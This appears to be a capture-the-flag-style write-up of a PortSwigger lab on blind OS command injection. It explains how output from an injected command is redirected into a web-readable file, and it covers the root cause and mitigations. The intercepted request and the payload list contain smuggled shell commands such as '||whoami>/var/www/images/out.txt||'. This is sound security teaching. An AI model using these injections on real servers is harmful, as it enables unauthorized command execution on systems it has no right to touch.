

## 💻 Blind OS Command Injection – With Output Redirection

**🧠 Difficulty:** Apprentice
**📚 Platform:** PortSwigger Web Security Academy
**👩‍💻 Author:** Kaouthar Belkebir

---

### 📌 Lab Description

This lab contains a **blind OS command injection** vulnerability, but instead of using time delays to confirm exploitation, we **redirect the output** of our command to a file on the server.

✅ **Goal:** Exploit the injection to redirect the output of `whoami` to a web-accessible location and read the result.

---

### 🧪 Exploitation Strategy

#### 🧩 The Trick:

Because it’s blind, we can’t see any command output directly in the response.
So, we use **output redirection** (`>`) to **write the result to a file** that we can then open in the browser.

---

### 📥 Intercepted Request (via Burp Suite)

```http
POST /feedback/submit HTTP/2
Host: [LAB_DOMAIN]
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

csrf=...&
name=kaouthar&
email=kaoutar%40gmail.com||whoami>/var/www/images/out.txt||&
subject=sjsw6&
message=anksnmm
```

📌 This payload injects the `whoami` command and saves its output in `/var/www/images/out.txt`, a web-accessible location.

---

### 🔍 Confirmation

Once the payload is sent:

* Open your browser and navigate to:
  `https://[LAB_DOMAIN]/image?filename=out.txt`

✅ If the command worked, you’ll see the output of `whoami` (e.g., `peter-ej0vux`) displayed in the browser.

---

### 🧠 Why This Works

* The backend uses shell commands with **unsanitized user input**.
* Injecting `||whoami>/var/www/images/out.txt||` executes the command and stores its output in a public file.

🧪 Other useful payloads you could try:

```bash
||ping -c 10 127.0.0.1||
||echo 'test'>/var/www/images/out.txt||

```

---

### 🔬 Root Cause

* The app concatenates user input directly into a shell command.
* No escaping or validation is in place to prevent shell metacharacter injection.

---

### ✅ Solution Confirmation

* ✅ The response may show: `"Could not save"` — ignore it.
* ✅ Check the file path via browser.
* 🎉 Lab will be marked as **SOLVED** when successful.

---

### 🛡️ Mitigation Strategies

* 🧼 Sanitize all user input before using it in shell commands.
* 🛡️ Prefer **safe system APIs** over direct shell invocation.
* 🧪 Implement **allow-list input validation**.

---

### 🖼️ Screenshot

![Blind OS Command Injection – Output Redirection](https://github.com/Kabilala/OS-command-injection/blob/main/lab3/lab3.png)

---

